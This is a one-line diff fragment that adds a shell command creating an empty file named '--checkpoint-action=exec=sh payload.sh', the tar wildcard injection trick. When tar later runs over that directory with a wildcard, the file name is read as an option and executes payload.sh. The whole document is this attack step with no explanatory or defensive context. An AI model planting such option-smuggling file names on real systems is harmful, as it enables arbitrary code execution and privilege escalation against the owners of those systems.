@@ -1,0 +1,1 @@
+echo "" > "--checkpoint-action=exec=sh payload.sh"
